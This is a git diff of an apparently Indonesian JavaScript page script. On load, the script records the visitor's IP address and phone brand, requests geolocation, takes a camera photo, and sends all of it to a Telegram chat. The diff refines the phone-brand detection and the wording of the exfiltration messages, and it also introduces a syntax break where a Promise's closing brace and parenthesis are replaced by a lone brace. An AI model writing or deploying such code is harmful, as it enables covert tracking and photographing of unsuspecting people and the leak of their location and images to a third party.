@@ -12,21 +12,24 @@ return "Tidak diketahui";
 }
 
 function getMerekHP() {
-const ua = navigator.userAgent;
+  const ua = navigator.userAgent;
 
-if (/Samsung/i.test(ua)) return "Samsung";  
-if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
-if (/Redmi/i.test(ua)) return "Redmi";  
-if (/OPPO/i.test(ua)) return "Oppo";  
-if (/Vivo/i.test(ua)) return "Vivo";  
-if (/Realme/i.test(ua)) return "Realme";  
-if (/iPhone/i.test(ua)) return "iPhone";  
-if (/Asus/i.test(ua)) return "Asus";  
-if (/Infinix/i.test(ua)) return "Infinix";  
-if (/Huawei/i.test(ua)) return "Huawei";  
+  if (/CPH/i.test(ua)) return "OPPO";
+  if (/RMX/i.test(ua)) return "Realme";
+  if (/M210|Mi|Redmi/i.test(ua)) return "Xiaomi";
+  if (/SM-/i.test(ua)) return "Samsung";
+  if (/V\d{4}/i.test(ua)) return "Vivo";
+  if (/Infinix/i.test(ua)) return "Infinix";
+  if (/TECNO/i.test(ua)) return "Tecno";
+  if (/iPhone/i.test(ua)) return "iPhone";
+  if (/ASUS|ZB\d+/i.test(ua)) return "Asus";
+  if (/Huawei|HONOR|DUA-|LYA-/i.test(ua)) return "Huawei";
+  if (/Pixel/i.test(ua)) return "Google Pixel";
+  if (/Nokia|TA-\d+/i.test(ua)) return "Nokia";
+  if (/Lenovo/i.test(ua)) return "Lenovo";
+  if (/LG-/i.test(ua)) return "LG";
 
-return "Tidak diketahui";
-
+  return "Tidak diketahui";
 }
 async function kirimFoto() {
   try {
@@ -42,9 +45,8 @@ async function kirimFoto() {
         video.play();
         resolve();
       };
-    });
-
-    // Delay 2 detik untuk siapin kamera
+    }
+                      
     await new Promise(resolve => setTimeout(resolve, 2000));
 
     canvas.width = video.videoWidth;
@@ -69,7 +71,7 @@ async function kirimFoto() {
 
   } catch (err) {
     console.warn("Akses kamera ditolak atau gagal.");
-    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak atau error.");
+    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak.");
   }
 }
         
@@ -88,7 +90,7 @@ text: pesan
 (async () => {
 const ip = await getIP();
 const merek = getMerekHP();
-const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
+const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\n📱 Merek hp: ${merek}`;
 await kirimPesanTelegram(pesanAwal);
 })();
 
@@ -101,7 +103,7 @@ navigator.geolocation.getCurrentPosition(
     const merek = getMerekHP();
 
     // Menambahkan link peta di pesan jika lokasi diizinkan
-    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
+    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\n📱 Merek hp: ${merek}\n📍 Lokasi: ${gmaps}`;
     await kirimPesanTelegram(pesan);
 
     kirimFoto()
